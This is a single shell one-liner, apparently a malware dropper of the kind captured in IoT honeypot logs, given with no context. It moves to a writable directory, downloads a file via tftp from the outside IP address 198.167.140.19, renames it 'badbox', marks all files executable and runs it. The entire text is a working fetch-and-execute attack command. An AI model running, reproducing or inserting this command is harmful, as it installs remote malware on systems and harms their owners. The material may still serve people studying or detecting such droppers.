cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r bash -g 198.167.140.19;cat bash >badbox;chmod +x *;./badbox
